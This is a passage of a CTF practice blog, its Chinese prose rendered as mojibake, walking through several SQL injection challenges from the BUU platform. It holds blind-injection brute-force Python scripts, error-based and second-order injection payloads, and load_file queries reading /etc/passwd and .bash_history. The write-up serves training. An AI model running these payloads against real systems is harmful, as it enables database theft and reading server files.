valueï¼ŒæŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ï¼Œé€šè¿‡NEXTç»§ç»­æµè§ˆã€‚</p><p>å¦‚æœæˆ‘ä»¬ä¸æƒ³æµè§ˆä¸€ä¸ªè¡¨çš„æ‰€æœ‰è¡Œï¼Œå¯ä»¥ä½¿ç”¨whereå’Œlimitå­å¥ã€‚</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</h2><p>ç›²æ³¨ï¼Œæ³¨å…¥ç‚¹åœ¨id</p><p>å¯ä»¥åˆ©ç”¨å¼‚æˆ–æ¥è¿›è¡Œç›²æ³¨</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210906123555686.png" alt="image-20210906123555686"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210906123751187.png" alt="image-20210906123751187"></p><p>æ‰¾ä¸ªè„šæœ¬ç›´æ¥çˆ†ç ´ï¼Œå­¦ä¸€ä¸‹è¿™ä¸ªè„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport sysimport timedef get_DBlen(url):    for i in range(1,10):        db_url &#x3D; url+&quot;1^1^(length(database())&#x3D;%d)#&quot;%i        r &#x3D; requests.get(db_url)        if &quot;Click&quot; in r.text:            print(&quot;æ•°æ®åº“åç§°çš„é•¿åº¦ä¸º:%d&quot;%i)            return idef get_DBname(url,length):    DBname &#x3D; &quot;&quot;    length &#x3D; length + 1    for i in range(1,length):        Max &#x3D; 122        Min &#x3D; 41        Mid &#x3D; (Max+Min)&#x2F;&#x2F;2        while Min &lt;&#x3D; Max:            # çˆ†è¡¨å            db_url &#x3D; url+&quot;1^1^(ascii(substr(database(),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid)            r &#x3D; requests.get(db_url)            if &quot;Click&quot; in r.text:                Min&#x3D;Mid+1                Mid&#x3D;(Min+Max)&#x2F;&#x2F;2                pass            else:                Max &#x3D; Mid-1                Mid &#x3D; (Min+Max)&#x2F;&#x2F;2                pass            pass        DBname &#x3D; DBname + chr(Mid)    print(DBname)    return DBnamedef get_TBname(url):    name&#x3D;&quot;&quot;    i &#x3D; 0    while True:        i &#x3D; i+1        Max &#x3D; 128        Min &#x3D; 32        Mid &#x3D; (Max+Min)&#x2F;&#x2F;2        while Min &lt;&#x3D; Max:            # çˆ†è¡¨å            # db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid)            # çˆ†å­—æ®µå            # db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid)            # è·å–flag            db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;&#x3D;%d)&quot;%(i,Mid)            r &#x3D; requests.get(db_url)            if &quot;Click&quot; in r.text:                Min&#x3D;Mid+1                Mid&#x3D;(Min+Max)&#x2F;&#x2F;2                pass            else:                Max&#x3D;Mid-1                Mid&#x3D;(Min+Max)&#x2F;&#x2F;2                pass            pass        name&#x3D;name+chr(Mid)        print(name)        if Mid &#x3D;&#x3D; 31:            break        time.sleep(0.5)  if __name__&#x3D;&#x3D;&quot;__main__&quot;:    url &#x3D; &quot;http:&#x2F;&#x2F;0b2df33c-3f5b-4b49-ae98-ca2c2c2e55bf.node4.buuoj.cn:81&#x2F;search.php?id&#x3D;&quot;    db_Len &#x3D; get_DBlen(url)    db_Name &#x3D; get_DBname(url,db_Len)    tb_name &#x3D; get_TBname(url)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210906151816679.png" alt="image-20210906151816679"></p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</h2><p>ç¬¬ä¸€æ¬¡é‡è§äºŒæ¬¡æ³¨å…¥çš„é¢˜ï¼Œæ­£å¥½å­¦ä¸€ä¸‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211026234512946.png" alt="image-20211026234512946"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211026234523294.png" alt="image-20211026234523294"></p><p>æºç é‡Œæœ‰ä¸ªfileï¼ŒçŒœæµ‹æœ‰æ–‡ä»¶åŒ…å«ï¼Œå¯ä»¥åˆ©ç”¨ä¼ªåè®®è¯»å–è¿™å‡ ä¸ªé¡µé¢çš„æºç </p><p>change.phpé¡µé¢</p><pre class="language-sql" data-language="sql"><code class="language-sql">&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;    $msg &#x3D; &#39;&#39;;    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;    $user_name &#x3D; $_POST[&quot;user_name&quot;];    $address &#x3D; addslashes($_POST[&quot;address&quot;]);    $phone &#x3D; $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;        $msg &#x3D; &#39;no sql inject!&#39;;    &#125;else&#123;        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;        $fetch &#x3D; $db-&gt;query($sql);    &#125;    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;        $row &#x3D; $fetch-&gt;fetch_assoc();        $sql &#x3D; &quot;update &#96;user&#96; set &#96;address&#96;&#x3D;&#39;&quot;.$address.&quot;&#39;, &#96;old_address&#96;&#x3D;&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where &#96;user_id&#96;&#x3D;&quot;.$row[&#39;user_id&#39;];        $result &#x3D; $db-&gt;query($sql);        if(!$result) &#123;            echo &#39;error&#39;;            print_r($db-&gt;error);            exit;        &#125;        $msg &#x3D; &quot;è®¢å•ä¿®æ”¹æˆåŠŸ&quot;;    &#125; else &#123;        $msg &#x3D; &quot;æœªæ‰¾åˆ°è®¢å•!&quot;;    &#125;&#125;else &#123;    $msg &#x3D; &quot;ä¿¡æ¯ä¸å…¨&quot;;&#125;</code></pre><p>ä¸»è¦çš„æ¼æ´ç‚¹å°±åœ¨change.php</p><p>å› ä¸ºå…¶ä»–è¾“å…¥ä½ç½®è¿‡æ»¤çš„å¤ªå¤šï¼ŒåŸºæœ¬èƒ½æ³¨å…¥çš„éƒ½è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥åªèƒ½åˆ©ç”¨address</p><p>åœ¨åˆ›å»ºaddressæ—¶è™½ç„¶å¯¹è¾“å…¥çš„æ•°æ®è¿›è¡Œäº†addslashesè¿‡æ»¤</p><p>ä½†ä¹‹åè¿˜ä¼šå¯¹æ—§addressè¿›è¡Œä¸€æ¬¡sqlæŸ¥è¯¢</p><p>å› æ­¤å¯ä»¥åˆ©ç”¨äºŒæ¬¡æ³¨å…¥ï¼Œå†ç»“åˆæŠ¥é”™æ³¨å…¥ï¼Œå’Œload_fileå‡½æ•°è¯»å–flagæ–‡ä»¶</p><p>åœ¨åˆ›å»ºæ—¶åœ¨åœ°å€ä¸­è¾“å…¥æ³¨å…¥è¯­å¥</p><p>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,20)),0x7e),1)#</p><p>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),21,50)),0x7e),1)#</p><p>ï¼ˆè¿™é‡Œä¹‹æ‰€ä»¥è¦çœ‹flag.txtæ ¹æ®å¸ˆå‚…ä»¬çš„åšå®¢æ¨æµ‹æ˜¯çº¯é çŒœçš„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211027000523555.png" alt="image-20211027000523555"></p><p>åœ¨ä¿®æ”¹åœ°å€çš„æ—¶å€™å°±ä¼šé‡æ–°è°ƒç”¨è¿™ä¸ªsqlè¯­å¥ï¼ŒæŠ¥é”™è¾“å‡ºflag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211027000543438.png" alt="image-20211027000543438"></p><h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>è¿™ä¹Ÿæ˜¯ä¸ªäºŒæ¬¡æ³¨å…¥</p><p>æ³¨å†Œåç™»å½•å†ä¿®æ”¹å¯†ç </p><p>åˆ©ç”¨æŠ¥é”™æ³¨å…¥</p><p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211028162141941.png" alt="image-20211028162141941"></p><p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;))),1))#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211028162259138.png" alt="image-20211028162259138"></p><p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(flag))from(flag))),1))#</p><p>ç¦»è°±ï¼Œè¢«éª—äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211028163357632.png" alt="image-20211028163357632"></p><p>é‡æ–°æŸ¥è¡¨</p><p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;))),1))#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211028170524356.png" alt="image-20211028170524356"></p><p>è¿™ä¸€çœ‹å°±æ˜¯æ²¡è¾“å‡ºå…¨</p><p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users))),1))#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211028170804487.png" alt="image-20211028170804487"></p><p>ï¼Ÿï¼Ÿï¼Ÿ</p><p>è¿™ä¸ªå­—æ®µé‡ŒåŠ äº†ä¸€å †æ²¡ç”¨çš„æ•°æ®</p><p>åªèƒ½ç”¨æ­£åˆ™regexpè¿‡æ»¤ä¸€ä¸‹</p><p>ethe&quot;||updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1)#</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211028171620967.png" alt="image-20211028171620967"></p><p>è¿˜æ˜¯æ²¡è¾“å‡ºå…¨</p><p>ä¹‹åå°±è¦ç”¨é€†åºè¾“å‡ºäº†</p><pre class="language-txt" data-language="txt"><code class="language-txt">ethe&quot;||updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),1)#</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211028171750860.png" alt="image-20211028171750860"></p><h2 id="ç½‘é¼æ¯-2018-Comment"><a href="#ç½‘é¼æ¯-2018-Comment" class="headerlink" title="[ç½‘é¼æ¯ 2018]Comment"></a>[ç½‘é¼æ¯ 2018]Comment</h2><p>æœ‰gitæ³„éœ²ï¼Œç”¨githackè·‘ä¸€éï¼Œç„¶ååˆ©ç”¨git log --reflogæŸ¥çœ‹å†å²æäº¤ï¼Œå†åˆ©ç”¨git resetå›æ»šç‰ˆæœ¬ï¼Œå¾—åˆ°åŸå§‹çš„ä»£ç </p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123;    header(&quot;Location: .&#x2F;login.php&quot;);    die();&#125;if(isset($_GET[&#39;do&#39;]))&#123;switch ($_GET[&#39;do&#39;])&#123;case &#39;write&#39;:    $category &#x3D; addslashes($_POST[&#39;category&#39;]);    $title &#x3D; addslashes($_POST[&#39;title&#39;]);    $content &#x3D; addslashes($_POST[&#39;content&#39;]);    $sql &#x3D; &quot;insert into board            set category &#x3D; &#39;$category&#39;,                title &#x3D; &#39;$title&#39;,                content &#x3D; &#39;$content&#39;&quot;;    $result &#x3D; mysql_query($sql);    header(&quot;Location: .&#x2F;index.php&quot;);    break;case &#39;comment&#39;:    $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]);    $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;;    $result &#x3D; mysql_query($sql);    $num &#x3D; mysql_num_rows($result);    if($num&gt;0)&#123;    $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;];    $content &#x3D; addslashes($_POST[&#39;content&#39;]);    $sql &#x3D; &quot;insert into comment            set category &#x3D; &#39;$category&#39;,                content &#x3D; &#39;$content&#39;,                bo_id &#x3D; &#39;$bo_id&#39;&quot;;    $result &#x3D; mysql_query($sql);    &#125;    header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;);    break;default:    header(&quot;Location: .&#x2F;index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: .&#x2F;index.php&quot;);&#125;?&gt;</code></pre><p>è¾“å…¥çš„å†…å®¹éƒ½è¢«addslashesè¿‡æ»¤äº†ï¼Œä½†æ˜¯åœ¨commentéƒ¨åˆ†ï¼Œcategoryæ˜¯ç›´æ¥ä»æ•°æ®åº“ä¸­è°ƒå‡ºæ¥çš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œå­˜åœ¨äºŒæ¬¡æ³¨å…¥</p><p>åœ¨å‘å¸–éƒ¨åˆ†ï¼šçš„categoryé‡Œè¾“å…¥x&#39;,content=database(),/*</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117213616672.png" alt="image-20211117213616672"></p><p>å†åœ¨æäº¤ç•™è¨€é‡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117213710038.png" alt="image-20211117213710038"></p><p>è¿™æ ·å¯ä»¥å½¢æˆå¤šè¡Œæ³¨é‡Šï¼Œæ³¨é‡Šæ‰åŸæœ‰çš„contentå­—æ®µ</p><p>å¯ä»¥å¾—åˆ°æ•°æ®åº“åç§°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117213738173.png" alt="image-20211117213738173"></p><p>è¿™æ—¶æŸ¥è¯¢è¯­å¥ä¸º</p><pre class="language-none"><code class="language-none">$sql &#x3D; &quot;insert into comment        set category &#x3D; &#39;x&#39;,content&#x3D;database(),&#x2F;*&#39;,            content &#x3D; &#39;*&#x2F;#&#39;,            bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre><p>å³</p><pre class="language-none"><code class="language-none">$sql &#x3D; &quot;insert into comment        set category &#x3D; &#39;x&#39;,content&#x3D;database(),            bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre><p><strong>SQLè¯»å–æ–‡ä»¶</strong><br>ç”¨load_file()å‡½æ•°è¿›è¡Œè¯»å–ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯è¯»å–æ–‡ä»¶å¹¶è¿”å›æ–‡ä»¶å†…å®¹ä¸ºå­—ç¬¦ä¸²ã€‚è¦ä½¿ç”¨æ­¤å‡½æ•°ï¼Œæ–‡ä»¶å¿…é¡»ä½äºæœåŠ¡å™¨ä¸»æœºä¸Šï¼Œå¿…é¡»æŒ‡å®šå®Œæ•´è·¯å¾„çš„æ–‡ä»¶ï¼Œè€Œä¸”å¿…é¡»æœ‰FILEæƒé™ã€‚ è¯¥æ–‡ä»¶æ‰€æœ‰å­—èŠ‚å¯è¯»ï¼Œä½†æ–‡ä»¶å†…å®¹å¿…é¡»å°äºmax_allowed_packetã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨æˆ–æ— æ³•è¯»å–ï¼Œå› ä¸ºå‰é¢çš„æ¡ä»¶ä¹‹ä¸€ä¸æ»¡è¶³ï¼Œå‡½æ•°è¿”å› NULLã€‚</p><p><strong>.bash_history</strong></p><p>åœ¨unix/linuxç³»ç»Ÿä¸‹ä¿å­˜å†å²å‘½ä»¤çš„æ–‡ä»¶ï¼Œåœ¨ç”¨æˆ·çš„æ ¹ç›®å½•ä¸‹ï¼Œå³<code>~/</code>å¤„ã€‚</p><p><strong>.DS_Storeæ–‡ä»¶æ³„éœ²</strong></p><p>æ–‡ä»¶æ³„éœ²ï¼Œæœ‰ä¸€ä¸ªä¸‹è½½è‡³æœ¬åœ°çš„<a href="https://github.com/lijiejie/ds_store_exp">è„šæœ¬</a>ï¼Œä¸è¿‡è¿™é¢˜ç”¨ä¸ä¸Šã€‚</p><p>åœ¨å‘å¸–ä¹‹å‰è¿˜æœ‰ä¸ªç™»å½•ç•Œé¢ï¼Œç”¨æˆ·åå’Œå¯†ç å‰å‡ ä½ç›´æ¥ç»™äº†ï¼Œå‰©ä¸‹ä¸‰ä½çˆ†ç ´å¾—åˆ°666</p><p>&#39;,content=(select(load_file(&quot;/etc/passwd&quot;))),/*</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117214221610.png" alt="image-20211117214221610"></p><p>è¿™ä¸€æ­¥åº”è¯¥æ˜¯ä¸ºäº†çŸ¥é“.bash_histroyæ–‡ä»¶çš„è·¯å¾„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117214325543.png" alt="image-20211117214325543"></p><p> &#39;,content=(select(load_file(&quot;/home/www/.bash_history&quot;))),/*</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117214355622.png" alt="image-20211117214355622"></p><p>æˆ‘ä»¬çœ‹åˆ°è¿›è¡Œäº†ä¸€ä¸ªè§£å‹ç„¶åå¤åˆ¶å’Œåˆ é™¤çš„æ“ä½œï¼Œè€Œ.DS_Storeåªåœ¨/var/www/html/ç›®å½•ä¸‹è¢«åˆ é™¤äº†ï¼Œ/tmp/htmlç›®å½•ä¸‹ä¾ç„¶å­˜åœ¨</p><p>æ¥ç€å†æŸ¥.DS_Store</p><p> &#39;,content=(select hex(load_file(&quot;/tmp/html/.DS_Store&quot;))),/*</p><p>ä¸ºäº†ä½¿å…¶å…¨éƒ¨æ˜¾ç¤ºï¼Œè¦ç”¨hexç¼–ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117214600582.png" alt="image-20211117214600582"></p><p>ç„¶åè§£ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117214639450.png" alt="image-20211117214639450"></p><p>çœ‹è§æœ‰ä¸ªflagæ–‡ä»¶</p><p>è¯»ä¸€ä¸‹</p><p>&#39;,content=(select hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;))),/*</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117214713821.png" alt="image-20211117214713821"></p><p>å†è§£ç ï¼Œæ‹¿åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117214747130.png" alt="image-20211117214747130"></p><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>orè¢«è¿‡æ»¤äº†ï¼Œæ²¡æ³•ç”¨informationæŸ¥è¡¨äº†ï¼Œä½†æ˜¯å¯ä»¥ç”¨</p><pre class="language-none"><code class="language-none">1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),1,1))&#x3D;1032||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()),&#123;&#125;,1))&#x3D;&#123;&#125;.format()</code></pre><p>æ­£ç¡®çš„æ—¶å€™è¿”å›Nu1Lï¼Œé”™è¯¯æ—¶è¿”å›V&amp;N</p><p>çˆ†è¡¨è„šæœ¬</p><pre class="language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;c581ac4d-17cf-437c-abc6-b0153526b868.node4.buuoj.cn:81&#x2F;&quot;payload &#x3D; &#39;2||ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;&#39;database&#x3D; &#39;&#39;for i in range(1,1000):low &#x3D; 32heigh &#x3D; 128mid &#x3D; (low + heigh) &#x2F;&#x2F; 2while (low &lt; heigh):payload1 &#x3D; payload.format(i,mid)post_data &#x3D; &#123;&#39;id&#39;: payload1&#125;r &#x3D; requests.post(url,data&#x3D;post_data)print(payload1)if &quot;Nu1L&quot; in r.text:low &#x3D; mid + 1else:heigh &#x3D; midmid &#x3D; (low + heigh) &#x2F;&#x2F; 2if mid &#x3D;&#x3D; 32:breakdatabase +&#x3D;chr(mid)print(database)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211123202113511.png" alt="image-20211123202113511"></p><p>å¾—åˆ°è¡¨ååï¼Œæ‹¿ä¸åˆ°åˆ—åï¼Œè¿™é‡Œå¯ä»¥ç”¨æ— åˆ—åæ³¨å…¥</p><p>å…ˆè´´payload</p><p>2||((select 1,&quot;{}&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))</p><p>é‡‡ç”¨äº†å­—ç¬¦åç§»</p><ul><li><p>æŒ‰ä½å»æ¯”è¾ƒï¼Œå¦‚æœçˆ†ç ´å­—ç¬¦ä¸flagçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ç›¸ç­‰ï¼Œå°±å‘åç»§ç»­ï¼Œå¤§äº†å°äº†éƒ½è¦ç»§ç»­å½“å‰çš„å¾ªç¯ï¼Œç›´åˆ°æ‰¾åˆ°åˆé€‚çš„å­—ç¬¦</p></li><li><p>æ‰€ä»¥æœ€åçš„midè¦å‡ä¸€æ‰æ˜¯æ­£ç¡®çš„å­—ç¬¦</p></li><li><p>è¿™é‡Œæˆ‘ä»¬ä¼ å…¥åå…­è¿›åˆ¶ï¼Œmysqlä¼šè‡ªåŠ¨å°†åå…­è¿›åˆ¶è½¬ä¸ºå­—ç¬¦</p></li><li><p>mysqlä¸åŒºåˆ†å¤§å°å†™ï¼Œæ¯”è¾ƒçš„æ—¶å€™O(0x4f)çš„asciiæ¯”f(0x66)çš„asciiå°ï¼Œä½†æ˜¯æ¯”è¾ƒçš„ç»“æœæ˜¯Oæ¯”få¤§ </p></li></ul><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211123202924585.png" alt="image-20211123202924585"></p><p>è¿™é‡Œè¦å’Œflagçš„è¡¨çš„åˆ—æ•°ä¸€æ ·</p><p>æœ€åè·‘ä¸€ä¸‹æ‹¿flag</p><pre class="language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;c581ac4d-17cf-437c-abc6-b0153526b868.node4.buuoj.cn:81&#x2F;index.php&quot;#payload &#x3D; &#39;2||ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;&#39;payload &#x3D; &#39;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#39;change &#x3D; &#39;&#39;database&#x3D; &#39;&#39;for j in range(1,100):for i in range(32,128):change &#x3D; database+chr(i)payload1 &#x3D; payload.format(change)print(payload1)data &#x3D; &#123;&#39;id&#39;: payload1&#125;r &#x3D; requests.post(url,data&#x3D;data)if &#39;Nu1L&#39; in r.text:database +&#x3D; chr(i-1)print(database)break</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211123205558046.png" alt="image-20211123205558046"></p><h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p>è¿›å…¥é¢˜ç›®ä¹‹åç‚¹å‡»ç½‘é¡µçš„å‡ ä¸ªæŒ‰é’®è¿ä¸ªè·³è½¬éƒ½æ²¡æœ‰ï¼Œé‡äº‹ä¸å†³æŠ“ä¸ªåŒ…çœ‹çœ‹</p><p>çœ‹åˆ°æœ‰ä¸ªsearchå‚æ•°ï¼Œè¿™é‡Œå­˜åœ¨sqlæ³¨å…¥</p><p>å…ˆç”¨order byæ¢ä¸€ä¸‹åˆ—æ•°ï¼Œç„¶åç›´æ¥è”åˆæ³¨å…¥</p><p>æ³¨è¡¨åï¼š</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408103158993.png" alt="image-20220408103158993"></p><p>ä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰ä»€ä¹ˆå¯ä»¥çš„è¡¨ï¼ŒçŒœæµ‹æ˜¯ä¸æ˜¯æœ‰å…¶ä»–åº“ï¼Œé‡æ–°å»çœ‹ä¸€ä¸‹åº“å</p><p>è¿™é‡Œç”¨database()åªèƒ½çœ‹åˆ°ä¸€ä¸ªaliensåº“ï¼Œå› ä¸ºdatabase()åªèƒ½çœ‹åˆ°å½“å‰åº“ï¼Œä¸‹æ¬¡è®°å¾—ä¸€å®šè¦æŠŠæ‰€æœ‰åº“éƒ½æŸ¥å‡ºæ¥</p><p>ç”¨<code>union+select+1,group_concat(schema_name)+from+information_schema.schemata</code>è¿™ä¸ªè¯­å¥å¯ä»¥æ³¨å‡ºå¦å¤–ä¸¤ä¸ªåº“<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104227983.png" alt="image-20220408104227983"></p><p>çœ‹ä¸€ä¸‹alien_codeåº“</p><pre class="language-none"><code class="language-none">search&#x3D;amazonis_planitia+union+select+1,group_concat(table_name)+from+information_schema.tables+where+table_schema&#x3D;&#39;alien_code&#39;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104425032.png" alt="image-20220408104425032"></p><p>å†çœ‹çœ‹codeè¡¨</p><pre class="language-none"><code class="language-none">search&#x3D;amazonis_planitia+union+select+1,group_concat(column_name)+from+information_schema.columns+where+table_name&#x3D;&#39;code&#39;</code></pre><p><img 